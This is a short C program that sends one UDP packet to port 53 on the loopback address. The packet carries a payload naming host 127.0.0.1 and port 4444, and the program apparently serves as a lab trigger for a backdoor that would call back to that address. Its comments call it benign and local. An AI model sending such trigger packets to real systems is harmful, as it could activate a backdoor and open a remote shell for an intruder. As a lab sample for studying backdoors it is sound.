#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int main(void) {
    struct sockaddr_in sin;
    int sin_len = sizeof(sin);
    int sock;
    int buf_len = 32;
    char buf[32];
    const char *payload = "X127.0.0.1:4444";
    size_t payload_len = strlen(payload);

    if ((sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0) {
        perror("error opening socket");
        exit(1);
    }

    memset((char *)&sin, 0, sizeof(sin));
    sin.sin_family = AF_INET;

    // Send to loopback only so the sample stays local to the lab host.
    sin.sin_port = htons(53);
    inet_aton("127.0.0.1", &sin.sin_addr);

    memset(buf, 0, sizeof(buf));
    memcpy(buf, payload, payload_len);

    if ((sendto(sock, buf, buf_len, 0, (struct sockaddr *)&sin, sin_len)) < 0) {
        perror("error sending data");
        exit(1);
    }

    printf("Sent benign trigger payload to 127.0.0.1:53\n");
    return 0;
}
